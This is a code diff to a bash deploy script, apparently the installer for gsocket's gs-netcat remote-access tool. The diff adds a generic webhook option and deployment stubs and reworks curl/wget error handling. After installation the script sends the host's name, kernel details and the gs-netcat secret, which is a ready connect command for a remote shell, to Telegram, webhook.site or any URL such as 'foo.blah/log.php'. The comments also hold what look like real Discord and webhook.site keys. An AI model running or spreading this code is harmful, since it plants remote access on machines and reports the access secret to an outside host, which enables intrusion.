@@ -51,6 +51,8 @@
 #       - Discord API key, ="1106565073956253736/mEDRS5iY0S4sgUnRh8Q5pC4S54zYwczZhGOwXvR3vKr7YQmA0Ej1-Ig60Rh4P_TGFq-m"
 # GS_WEBHOOK_KEY=
 #       - https://webhook.site key, ="dc3c1af9-ea3d-4401-9158-eb6dda735276"
+# GS_WEBHOOK=
+#       - Generic webhook, ="https://foo.blah/log.php?s=\${GS_SECRET}"
 # GS_HOST=
 #       - IP or HOSTNAME of the GSRN-Server. Default is to use THC's infrastructure.
 #       - See https://github.com/hackerschoice/gsocket-relay
@@ -67,6 +69,12 @@ URL_DEPLOY="${URL_BASE}/x"
 [[ -n $GS_URL_BIN ]] && URL_BIN="${GS_URL_BIN}"
 [[ -n $GS_URL_DEPLOY ]] && URL_DEPLOY="${GS_URL_DEPLOY}"
 
+# STUBS for deploy_server.sh to fill out:
+gs_deploy_webhook=
+GS_WEBHOOK_404_OK=
+[[ -n $gs_deploy_webhook ]] && GS_WEBHOOK="$gs_deploy_webhook"
+unset gs_deploy_webhook
+
 # WEBHOOKS are executed after a successfull install
 msg='$(hostname) --- $(uname -rom) --- gs-netcat -i -s ${GS_SECRET}'
 ### Telegram
@@ -75,6 +83,11 @@ msg='$(hostname) --- $(uname -rom) --- gs-netcat -i -s ${GS_SECRET}'
 [[ -n $GS_TG_TOKEN ]] && [[ -n $GS_TG_CHATID ]] && {
 	GS_WEBHOOK_CURL=("--data-urlencode" "text=${msg}" "https://api.telegram.org/bot${GS_TG_TOKEN}/sendMessage?chat_id=${GS_TG_CHATID}&parse_mode=html")
 	GS_WEBHOOK_WGET=("https://api.telegram.org/bot${GS_TG_TOKEN}/sendMessage?chat_id=${GS_TG_CHATID}&parse_mode=html&text=${msg}")
+}
+### Generic URL as webhook (any URL)
+[[ -n $GS_WEBHOOK ]] && {
+	GS_WEBHOOK_CURL=("$GS_WEBHOOK")
+	GS_WEBHOOK_WGET=("$GS_WEBHOOK")
 }
 ### webhook.site
 # GS_WEBHOOK_KEY="dc3c1af9-ea3d-4401-9158-eb6dda735276"
@@ -714,12 +727,14 @@ init_vars()
 	[[ $GS_DL == "curl" ]] && DL_CMD="$DL_CRL"
 	if [[ "$DL_CMD" == "$DL_CRL" ]]; then
 		IS_USE_CURL=1
-		DL=("curl" "-fsL" "--connect-timeout" "7" "-m30" "--retry" "3")
+		### Note: need -S (--show-errors) to process 404 for CF webhooks.
+		DL=("curl" "-fsSL" "--connect-timeout" "7" "-m30" "--retry" "3")
 		[[ -n $GS_DEBUG ]] && DL+=("-v")
 		[[ -n $GS_NOCERTCHECK ]] && DL+=("-k")
 	elif [[ "$DL_CMD" == "$DL_WGT" ]]; then
 		IS_USE_WGET=1
-		DL=("wget" "-qO-" "--connect-timeout=7" "--dns-timeout=7")
+		### Note: Dont use -q: Need errors to process 404 for CF webhooks
+		DL=("wget" "-O-" "--connect-timeout=7" "--dns-timeout=7")
 		[[ -n $GS_NOCERTCHECK ]] && DL+=("--no-check-certificate")
 
 	else
@@ -1197,8 +1212,8 @@ dl_ssl()
 
 	shift 3
 	if [[ -z $GS_NOCERTCHECK ]]; then
-		DL_LOG=$("$cmd" "$@" 2>&1)
-		[[ "${DL_LOG}" != *"$sslerr"* ]] && return
+		DL_ERR="$("$cmd" "$@" 2>&1 1>/dev/null)"
+		[[ "${DL_ERR}" != *"$sslerr"* ]] && return
 	fi
 
 	FAIL_OUT "Certificate Error."
@@ -1206,7 +1221,7 @@ dl_ssl()
 	[[ -z $GS_NOCERTCHECK ]] && return
 
 	echo -en "--> Downloading binaries without certificate verification............."
-	DL_LOG=$("$cmd" "$arg_nossl" "$@" 2>&1)
+	DL_ERR="$("$cmd" "$arg_nossl" "$@" 2>&1 1>/dev/null)"
 }
 
 # Download $1 and save it to $2
@@ -1232,7 +1247,7 @@ dl()
 	fi
 
 	# Download failed:
-	[[ ! -s "$2" ]] && { FAIL_OUT; echo "$DL_LOG"; exit_code 255; } 
+	[[ ! -s "$2" ]] && { FAIL_OUT; echo "$DL_ERR"; exit_code 255; } 
 }
 
 # S= was set. Do not install but execute in place.
@@ -1347,24 +1362,25 @@ do_webhook()
 	done
 
 	# echo "arr=${#arr[@]}: ${arr[@]}"
-	"${arr[@]}" >/dev/null
+	"${arr[@]}"
 }
 
 webhooks()
 {
 	local arr
 	local ok
-
-	[[ -n ${GS_WEBHOOK_CURL[0]} ]] && ok=1
-	[[ -n ${GS_WEBHOOK_WGET[0]} ]] && ok=1
+	local err
 
 	echo -en "Executing webhooks...................................................."
-	[[ -z $ok ]] && { SKIP_OUT; return; }
+	[[ -z ${GS_WEBHOOK_CURL[0]} ]] && { SKIP_OUT; return; }
+	[[ -z ${GS_WEBHOOK_WGET[0]} ]] && { SKIP_OUT; return; }
 
 	if [[ -n $IS_USE_CURL ]]; then
-		[[ -n ${GS_WEBHOOK_CURL[0]} ]] && { do_webhook "${DL[@]}" "${GS_WEBHOOK_CURL[@]}" || unset ok; }
+		err="$(do_webhook "${DL[@]}" "${GS_WEBHOOK_CURL[@]}" 2>&1)" && ok=1
+		[[ -z $ok ]] && [[ -n $GS_WEBHOOK_404_OK ]] && [[ "${err}" == *"requested URL returned error: 404"* ]] && ok=1
 	elif [[ -n $IS_USE_WGET ]]; then
-		[[ -n ${GS_WEBHOOK_WGET[0]} ]] && { do_webhook "${DL[@]}" "${GS_WEBHOOK_WGET[@]}" || unset ok; }
+		err="$(do_webhook "${DL[@]}" "${GS_WEBHOOK_WGET[@]}" 2>&1)" && ok=1
+		[[ -z $ok ]] && [[ -n $GS_WEBHOOK_404_OK ]] && [[ "${err}" == *"ERROR 404: Not Found"* ]] && ok=1
 	fi
 	[[ -n $ok ]] && { OK_OUT; return; }
 
